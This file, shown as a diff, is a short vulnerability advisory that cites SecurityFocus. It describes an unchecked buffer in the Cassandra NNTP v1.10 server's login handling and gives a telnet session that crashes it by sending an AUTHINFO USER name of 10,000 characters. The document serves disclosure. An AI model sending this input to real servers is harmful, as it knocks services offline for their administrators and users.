@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/1156/info
+
+Unchecked buffer exists in the code that handles login information in Cassandra NNTP v1.10 server. Entering a login name that consists of over 10 000 characters will cause the server to stop responding until the administrator restarts the application.
+
+[host$ telnet target 119
+Trying target...
+Connected to target.
+Escape character is '^]'.
+200 CASSANDRA NNTP-Server (v1.10.01 Unregistered) for Windows 95 ready at Mon, 1
+May 2000 xx:xx:xx +-300 (posting allowed) 
+
+AUTHINFO USER <10 000 character string>
+
+
+Where buffer is 10000 characters.
